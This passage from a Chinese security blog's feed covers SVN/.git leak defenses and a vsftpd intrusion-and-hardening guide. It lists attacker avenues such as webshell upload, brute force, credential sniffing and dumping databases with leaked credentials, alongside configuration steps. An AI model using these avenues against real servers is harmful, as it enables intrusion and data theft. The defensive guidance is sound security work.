class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">另外,针对.git泄露的利用,其实跟上面的原理基本是一模一样的,只是找文件名的地方不同而已,换汤不换药,这里就不细说了</span><br><span class="line">当然,专门针对github的更多信息搜集技巧,后续抽空也会单独拿出来说明,这里就先不多啰嗦了 ^_^</span><br></pre></td></tr></table></figure><p>0x09 针对svn的绝大部分安全问题可能都在泄露上,所以,为了更好的解决这些问题,下面给出了一些针对性的防护策略<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">禁止各类搜索引擎对.svn,.git以及其它的一些敏感目录进行爬取,一般可在robots.txt文件中定义</span><br><span class="line">如果是配合web一起使用,则可利用apache或者nginx自身配置,对.svn,.git,.ds_store...之类的敏感目录禁止访问</span><br><span class="line">删除svn服务器上所有的.svn...等不必要的敏感目录</span><br><span class="line">禁止开发人员在使用svn时,直接复制代码,务必严格使用导出功能</span><br><span class="line">至于爆破svn,本人还从来没成功过,如果有哪位朋友成功了,也非常期待能一起交流……^_^</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>0x10 关于其它的各种web泄露,防御方法都非常简单,对所有的这些敏感目录直接在web服务器配置中禁止对其访问即可,实在没用的就直接删掉,不然留那儿,别人扫目录很可能就随随便便扫到了,或者你也可以想办法直接不让他扫,如下,是我们常见的一些泄露,有时候实在搞不懂为什么会犯这么低级的错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">网站各种备份泄露,如,数据库,后端代码文件...</span><br><span class="line">svn及git泄露,如,各类账号密码,敏感配置...</span><br><span class="line">WEB-INF/web.xml敏感配置泄露</span><br><span class="line">DS_store 文件泄露</span><br><span class="line">等,等,等...</span><br></pre></td></tr></table></figure></p><p><br><br>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;大家也看到了,这其实跟技术关系并不大,意识到了,自然就防住了,实在没什么好说的,因为侧重主要还是在防入侵上,关于svn涉及到的其它的一些边缘性的安全问题这里就没细说了,最后,如果大家还有更多更刁钻的手法,也非常期待能一起交流 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于 svn&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;同属C/S架构,对于svn服务端来讲,任何一个文件,在任何时刻的变化,都会被svn详细记录,并自动备份修改之前的结果,方便后续回滚&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;其实,底层也是靠一个独立的`文件系统 FSFS`在维护,更多内部工作细节,大家可以直接去参考百科说明,此处废话不多讲,我们真奔主题...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;演示环境,注,此处为独立部署svn服务器,并非配合web服务一起使用&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;CentOS6.9_x86_64 ip: 192.168.3.59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;win7cn		 ip: 192.168.3.70&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 作为一名入侵者,从&lt;code&gt;svn&lt;/code&gt;中你都能发掘到什么宝藏&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;可能最容易拿到的就是数据库的各种连接账号密码,前提是,目标数据库允许外连,这样你才能更优雅的脱裤或者想办法构造上传webshell&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;一些邮箱账号密码,如果目标有自己的vpn或者owa之类的入口还是很值得尝试的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;直接的后端代码,除了能局部审下代码之外,在注释里面也许还能看到一些关于开发人员的敏感信息&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;其它的各种敏感配置信息,非常多,这里就不一一细说了&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;注意,有些信息,确实不能让我们一刀毙敌,但高效的渗透往往是对各类敏感信息的相互配合及深度利用,这非常重要&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="svn" scheme="https://evil-404.github.io/categories/svn/"/>
    
    
      <category term="svn" scheme="https://evil-404.github.io/tags/svn/"/>
    
  </entry>
  
  <entry>
    <title>简述 FTP 入侵与防御 [ vsftpd ]</title>
    <link href="https://evil-404.github.io/2017-12-10-vsftp-secfig.html"/>
    <id>https://evil-404.github.io/2017-12-10-vsftp-secfig.html</id>
    <published>2017-12-09T20:09:17.000Z</published>
    <updated>2017-12-23T02:02:46.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 首先,我们先来简单思考下,当你面对一台 ftp 时,到底能做些什么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">挖0day,抱歉,并不在今天的讨论范畴 ^_^</span><br><span class="line">允许匿名可写,直接上传webshell,一般极小的个人站才有可能,ftp目录即网站目录</span><br><span class="line">允许匿名下载,造成的敏感文件信息泄露</span><br><span class="line">爆破,亦可造成敏感配置泄露</span><br><span class="line">嗅探,搜集各种明文账号密码,然后再拿着这些账号密码,去撞目标的其它入口,或以此进行进一步的内网渗透</span><br><span class="line">提权,linux平台下基本不可能</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>0x02 相对主流的一些ftp工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vsftpd proftpd filezilla ...</span><br></pre></td></tr></table></figure></p><p>0x03 深入理解ftp的主动与被动工作模式</p><p><code>命令连接</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在客户端向ftp服务端发起连接请求时,客户端会随机选择本地的某个tcp端口与ftp服务端的21端口进行连接</span><br><span class="line">这中间会进行一系列的身份验证过程,待验证通过后,客户端与ftp服务端即会成功建立 `命令连接`</span><br><span class="line">所谓的 `命令传输连接` 也就是说,仅仅只会用这个连接来传输命令本身</span><br></pre></td></tr></table></figure></p><p><code>主动模式</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在 `命令连接` 建立成功后,客户端可能还需要进行一系列的数据传输动作,如,上传,下载文件...</span><br><span class="line">此时,客户端会先在本地另启一个端口监听等待连接,并利用先前与ftp客户端建立好的`命令连接`通道,告诉ftp服务端客户端所监听的端口</span><br><span class="line">而后,ftp服务端会利用自身的20端口和刚才ftp客户端所告知的端口进行数据连接,随后就开始利用此连接来进行各类数据传输</span><br><span class="line">注意,此时`数据连接`在建立的过程中,是ftp服务端的20端口主动连接FTP客户端的随机端口的,也就是我们所说的`主动模式`</span><br></pre></td></tr></table></figure></p><a id="more"></a><p><code>被动模式</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">依然是在成功建立`命令连接`之后,客户端需要进行文件上传下载...</span><br><span class="line">与主动模式不同的是,此时,ftp客户端将通过`命令连接`通道告诉ftp服务端的并不是客户端本地的那个随机端口</span><br><span class="line">而是会向服务端发出一个PASV指令,该指令的作用就是告诉ftp服务端,准备采用被动模式来建立连接</span><br><span class="line">当ftp服务端采用被动模式来连接时,会先读取自己配置文件中事先设置好的那个端口范围</span><br><span class="line">从中随机取出一个端口在服务端本地进行监听,而后再通过命令连接通道将ftp服务端本地监听的那个随机端口告给知客户端</span><br><span class="line">最后,客户端则会在本地随机起一个端口与刚刚服务端监听的那个数据端口进行连接,而后即可进行正常的数据传输</span><br></pre></td></tr></table></figure></p><p><code>如何选择主动与被动</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在常规内网环境中,主动和被动模式的意义并不是非常大,但,如果你是直接给公网提供的ftp服务这个就稍微有意义了</span><br><span class="line">主动模式,也就意味着`客户端本地的数据端口是随机的`,如果被客户端本地防火墙所限制则无法进行数据传输</span><br><span class="line">被动模式,此时意味着`服务端的数据传输端口是随机的`,你需要在服务端的防火墙中放开对指定端口范围的限制,否则一样无法进行数据传输</span><br><span class="line">相比之下,被动模式可能更适用于公网环境,了解即可,我们言归正传,如何部署一个安全的ftp服务</span><br></pre></td></tr></table></figure></p><p>0x04 此次演示环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RHEL6.6_i386 ip: 192.168.3.57</span><br><span class="line">win7cnip: 192.168.3.70</span><br></pre></td></tr></table></figure></p><p>0x05 安装<code>vsftpd 2.2.2</code>,我这个版本已经比较旧了<code>直接用的是iso 包里的提供的</code>,建议大家尽量还是用新一点的版本,毕竟只是个ftp工具而已,大可不必像web那样,对每个版本选择都小心谨慎,用新一点的版本,也能在一定程度上帮大家避免一些已知高危漏洞,ftp的溢出还是非常非常多的,废话不多说,咱们真奔主题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># rpm -qa vsftpd</span><br><span class="line"># yum install -y vsftpd</span><br><span class="line"># mv /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak</span><br></pre></td></tr></table></figure></p><p>0x06 详细配置 vsftpd,这里暂以配置<code>虚拟用户登陆</code>为主,关于<code>匿名用户</code>和<code>本地系统用户登陆</code>配置,只做顺带说明,不做详述,另外,请务必注意,<code>在配置vsftpd.conf时,每个选项前后都务必不能有空格</code>,不然,你会发现,虽然重启服务看似没什么问题,但选项会一直不生效</p><p>下面是 vsftpd 自身配置的一些常用选项说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/vsftpd/vsftpd.conf</span><br><span class="line"></span><br><span class="line">ftpd_banner=Welcome klion&apos;s FTP server!# ftp服务端登陆欢迎信息</span><br><span class="line">listen=YES# 以standalone模式运行vsftpd</span><br><span class="line">listen_ipv6=NO# 禁用ipv6</span><br><span class="line">listen_port=21# 默认监听的命令连接端口,大多数情况下,我们其实都不需要改</span><br><span class="line">tcp_wrappers=YES# 默认就是开启的,主要可以用它来限制ip访问,到/etc/hosts.allow中配置即可</span><br><span class="line">idle_session_timeout=300# 指定连接闲置时长,当闲置指定秒数后就自动断开连接</span><br><span class="line">data_connection_timeout=150# 指定数据连接超时时长,如果超过规定秒数数据连接还没建立就自动断开</span><br><span class="line">ascii_upload_enable=NO# 禁止以文本格式传输数据,防止数据被破坏,虽然默认就是NO,但习惯性还是给上</span><br><span class="line">ascii_download_enable=NO</span><br><span class="line">write_enable=YES# 是否允许ftp用户写,如果想让他上传文件务必要能写才行</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 文件上传后的默认权限,为了不让其他人看,可以设为077,注意,这里只是ftp用户权限的unmsk跟系统权限的unmask没任何关系</span><br><span class="line">local_umask=077</span><br><span class="line"></span><br><span class="line"># 主要用来对ftp下的各个目录作用进行简要描述</span><br><span class="line"># 使用方法很简单,只需在指定的ftp目录下创建.message文件,之后在里面写上具体的说明内容即可</span><br><span class="line"># 这样每次只要用户进到该目录中就会自动读取该文件中的内容并提示给用户</span><br><span class="line">dirmessage_enable=YES</span><br><span class="line"></span><br><span class="line"># vsftpd日志设置</span><br><span class="line">xferlog_enable=YES</span><br><span class="line">xferlog_std_format=YES# 指定日志格式,使用默认的标准格式即可</span><br><span class="line">xferlog_file=/var/log/vsftpd.log# vsftpd日志存放位置,这里默认只记录了上传下载的数据,并没有记录登陆状态</span><br><span class="line"></span><br><span class="line"># 启用被控模式进行数据连接,vsftpd在此模式下会自动从此端口范围内随机选择一个进行监听</span><br><span class="line">pasv_enable=YES</span><br><span class="line">pasv_min_port=65200# 指定数据连接端口最小为多少,端口尽量给高点</span><br><span class="line">pasv_max_port=65410# 指定数据连接端口最大为多少</span><br><span class="line"></span><br><span class="line">max_clients=100# 设置vsftpd最大并发连接数</span><br><span class="line">max_per_ip=2# 设置单个ip的最大连接数</span><br></pre></td></tr></table></figure></p><p>0x07 <code>允许匿名用户登陆</code>的相关配置,此设配置极不安全,虽然配置简单,但绝不推荐,如果有实际需求,不如用http下载代替<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">anonymous_enable=NO# 是否启用匿名登陆</span><br><span class="line"></span><br><span class="line"># 是否允许匿名用户上传文件,单单这样启用还是上传不了的</span><br><span class="line">anon_upload_enable=NO</span><br><span class="line">anon_mkdir_write_enable=NO   # 是否允许匿名用户新建目录</span><br><span class="line">anon_other_write_enable=NO   # 是否允许匿名用户其它的写权限,比如,允许匿名用户删除目录或文件</span><br><span class="line">anon_world_readable_only=YES # 允许匿名用户下载</span><br><span class="line">anon_max_rate=10000     # 匿名用户最大的数据传输速度</span><br></pre></td></tr></table></figure></p><p>匿名用户想上传文件的单独授权过程,默认vsftpd是以<code>ftp</code>的系统用户身份在运行,所以需要配合setfacl来进行单独授权才行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># ls -dl /var/ftp</span><br><span class="line"># mkdir /var/ftp/upfiles</span><br><span class="line"># setfacl -m u:ftp:rwx /var/ftp/upfiles</span><br><span class="line"># getfacl /var/ftp/upfiles此时就可以正常上传文件,创建目录了</span><br></pre></td></tr></table></figure></p><p><img src="/img/facl vsftpd.png" alt=""><br><img src="/img/facl vsftpd anon.png" alt=""></p><p>0x08 <code>允许本地系统用户登陆</code>的相关配置,默认ftp用户登陆成功后都会进到自己的家目录下,如果配置不当,允许ftp用户随意切换到其它的系统目录下,很容易造成系统敏感信息泄露,极不安全,另外,大批量权限控制也比较繁琐,容易遗漏,不推荐用于实战<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">  pam_service_name=vsftpd# 启用pam认证,其实默认就是启用的,否则本地是登陆不成功的</span><br><span class="line">  local_enable=YES# 启用本地用户登陆</span><br><span class="line"></span><br><span class="line">  # 禁止所有ftp用户访问其它的系统目录,尽可能把它严格控制在自己的家目录下,实际测试多次测试并未成功</span><br><span class="line">  chroot_local_user=YES</span><br><span class="line">  chroot_list_enable=NO</span><br><span class="line"></span><br><span class="line"># useradd -s /sbin/nologin admin</span><br><span class="line"># echo &quot;admin&quot; | passwd --stdin admin</span><br><span class="line"></span><br><span class="line"># useradd -s /sbin/nologin sysadm</span><br><span class="line"># echo &quot;admin&quot; | passwd --stdin sysadm</span><br></pre></td></tr></table></figure></p><p><img src="/img/local user login.png" alt=""></p><p>只让指定的ftp用户能访问到其它的系统目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">  chroot_local_user=YES</span><br><span class="line">  chroot_list_enable=YES</span><br><span class="line">  chroot_list_file=/etc/vsftpd.chroot_list</span><br><span class="line">  local_max_rate=10000# 限制本地用户最大的数据传输速度</span><br><span class="line"></span><br><span class="line"># 把所有能访问到其它系统目录的用户名都事先写到改文件中,每行对应一个用户名</span><br><span class="line"># vi /etc/vsftpd.chroot_list</span><br><span class="line">  admin</span><br></pre></td></tr></table></figure></p><p><img src="/img/local user login list.png" alt=""></p><p>0x09 <code>基于虚拟用户登陆</code>的相关配置,注意,虚拟用户<code>不是系统账号,跟系统账号压根就没有任何关系,所有的ftp虚拟用户到最后统统都会被压缩映射为一个指定的低权限系统账户</code>,我们在前面说nfs时也提到过权限压缩,这跟那其实是一个意思,实战中推荐以此方式来部署ftp</p><p>首先,创建虚拟用户口令文件,注意,<code>奇数行是账号,偶数行为对应的密码</code>,实际的密码务必要严格遵守<code>密码复杂性要求</code>,可千万不能像我下面这么干<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/vsftpd/vsftpd_user.txt</span><br><span class="line">  webadmin</span><br><span class="line">  admin110</span><br><span class="line">  web</span><br><span class="line">  123456</span><br></pre></td></tr></table></figure></p><p>其次,将上面创建的口令文件转换成系统识别的口令文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># yum install db4 db4-utils -y</span><br><span class="line"># rpm -qa | grep db4-utils</span><br><span class="line"># db_load -T -t hash -f /etc/vsftpd/vsftpd_user.txt /etc/vsftpd/vsftpd_passwd.db</span><br></pre></td></tr></table></figure></p><p>而后,再来修改vsftpd的PAM认证文件,将文件中的原有内容先全部注释掉,添加如下两句,其实,意思就是让它到这儿来读密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/pam.d/vsftpd</span><br><span class="line">  auth required /lib/security/pam_userdb.so db=/etc/vsftpd/vsftpd_passwd</span><br><span class="line">  account required /lib/security/pam_userdb.so db=/etc/vsftpd/vsftpd_passwd</span><br></pre></td></tr></table></figure></p><p>再者,创建好要映射到的系统用户并修改该用户默认的家目录权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># useradd -d /home/ftpdata -s /sbin/nologin nosir</span><br><span class="line"># chmod go+rx /home/ftpdata/</span><br></pre></td></tr></table></figure></p><p>最后,到vsftpd.conf中去<code>启用虚拟用户功能</code>,并为每个虚拟用户单独赋予指定的ftp权限,个人认为这个权限并不是很彻底,算了,又不是军工级别,不必太过强求 ^_^<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">  anonymous_enable=YES</span><br><span class="line">  local_enable=YES</span><br><span class="line">  write_enable=YES</span><br><span class="line">  anon_upload_enable=NO</span><br><span class="line">  anon_mkdir_write_enable=NO</span><br><span class="line">  chroot_local_user=YES</span><br><span class="line">  </span><br><span class="line">  pam_service_name=vsftpd</span><br><span class="line">  guest_enable=YES</span><br><span class="line">  guest_username=nosir</span><br><span class="line">  user_config_dir=/etc/vsftpd/vusers_config</span><br></pre></td></tr></table></figure></p><p>为不同的虚拟用户指定不同的ftp权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /etc/vsftpd/vusers_config/</span><br><span class="line"># cd /etc/vsftpd/vusers_config/</span><br><span class="line"># touch web webadmin此处的文件名务必和ftp用户同名</span><br><span class="line"># vi /etc/vsftpd/vusers_config/web 让web用户能进行正常的上传下载,创建,删除...</span><br><span class="line">  local_root=/var/ftp/upfiles# 也可单独指定某个虚拟用户的根目录</span><br><span class="line">  anon_upload_enable=YES</span><br><span class="line">  anon_mkdir_write_enable=YES</span><br><span class="line">  anon_other_write_enable=YES</span><br><span class="line">  anon_world_readable_only=YES</span><br><span class="line"></span><br><span class="line"># vi /etc/vsftpd/vusers_config/webadmin让webadmin用户只能干看着</span><br><span class="line">  anon_upload_enable=NO</span><br><span class="line">  anon_mkdir_write_enable=NO</span><br><span class="line">  anon_other_write_enable=NO</span><br></pre></td></tr></table></figure></p><p><img src="/img/virutal user login.png" alt=""><br><img src="/img/virutal user login res.png" alt=""></p><p>0x10 在针对ftp的所有入侵中,除了各类RCE之外的首要危害就是默认数据全部使用<code>明文传输</code>,这也就直接导致了我们的账号密码,极易被入侵者捕获并深度利用,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#  tcpdump -i eth0 -nn -XX -s 0 host 192.168.3.57 and tcp dst port 21</span><br></pre></td></tr></table></figure></p><p><img src="/img/virutal user login tcpdump.png" alt=""></p><p>为了更好的解决上述问题,我们需要在vsftpd的数据外面再上加一层ssl,来暂时性对抗此类嗅探<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># ldd `which vsftpd`|grep ssl  检查当前的vsftpd是否支持ssl</span><br><span class="line"># openssl req -new -x509 -nodes -out vsftpd.pem -keyout vsftpd.pem</span><br><span class="line"># chmod 400 vsftpd.pem</span><br><span class="line"># cp vsftpd.pem /etc/ssl/certs/</span><br><span class="line"># vi /etc/vsftpd/vsftpd.conf</span><br><span class="line">  ssl_enable=YES</span><br><span class="line">  allow_anon_ssl=YES</span><br><span class="line">  force_local_data_ssl=YES</span><br><span class="line">  force_local_logins_ssl=YES</span><br><span class="line">  force_anon_logins_ssl=YES</span><br><span class="line">  force_anon_data_ssl=YES</span><br><span class="line">  ssl_tlsv1=YES</span><br><span class="line">  ssl_sslv2=NO</span><br><span class="line">  ssl_sslv3=NO</span><br><span class="line">  rsa_cert_file=/etc/ssl/certs/vsftpd.pem</span><br></pre></td></tr></table></figure></p><p><img src="/img/virutal user login flashftp.png" alt=""></p><p>重启vsftpd,让所有配置生效,并让vsftpd随系统自启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># systemctl start vsftpd</span><br><span class="line"># chkconfig vsftpd on</span><br></pre></td></tr></table></figure></p><p>0x11 观察vsftpd的各种日志信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /var/log/secure可自行写脚本来实时提取爆破ip,比较简单,这里就不多说了</span><br><span class="line"># tail -f /var/log/vsftpd.log</span><br></pre></td></tr></table></figure></p><p><img src="/img/virutal user login access.png" alt=""></p><p>0x12 勤于关注官方所发布的各类高危补丁,及时进行修补,vsftpd不比其它工具,漏洞是经常的,而且一般还都是可直接被远程利用的,所以,务必多留点儿心<br><br></p><p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于ftp安全,其实,差不多就这些了,只要时刻记住不要让客户端直接以本地系统用户身份来登陆操作,让ftp服务始终运行在一个较低的系统权限下,禁止匿名或者禁止匿名可写,别人此时再想通过ftp来拿到服务器权限就比较困难了,而且像ftp这种极小规模的文件共享服务,适用场景绝大多数都在内网,另外,vsftpd虚拟用户身份验证除了上面在这种基于文件的方式,同样也可以基于数据库来进行认证,如,mysql,非常简单,换汤不换药,大家有兴趣可以去自己尝试,只不过,基于数据库会更加灵活,因为非常方便通过脚本进行进一步处理,如,php,python…今天就先到这里吧,祝大家好运,也欢迎多来一起交流 ^_^</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 首先,我们先来简单思考下,当你面对一台 ftp 时,到底能做些什么&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;挖0day,抱歉,并不在今天的讨论范畴 ^_^&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;允许匿名可写,直接上传webshell,一般极小的个人站才有可能,ftp目录即网站目录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;允许匿名下载,造成的敏感文件信息泄露&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;爆破,亦可造成敏感配置泄露&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;嗅探,搜集各种明文账号密码,然后再拿着这些账号密码,去撞目标的其它入口,或以此进行进一步的内网渗透&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;提权,linux平台下基本不可能&lt;/span&gt;&lt;br&gt;&lt;span 